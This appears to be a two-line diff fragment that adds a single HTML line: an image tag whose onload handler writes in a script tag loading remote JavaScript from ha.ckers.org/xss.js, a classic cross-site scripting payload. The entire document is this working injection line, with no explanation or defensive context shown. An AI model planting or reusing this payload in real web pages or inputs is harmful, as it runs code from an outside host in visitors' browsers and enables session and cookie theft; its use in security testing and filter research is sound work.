@@ -1,0 +1,2 @@
+<img src="/site_logo.jpg" onload="document.write('<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>');" >
+
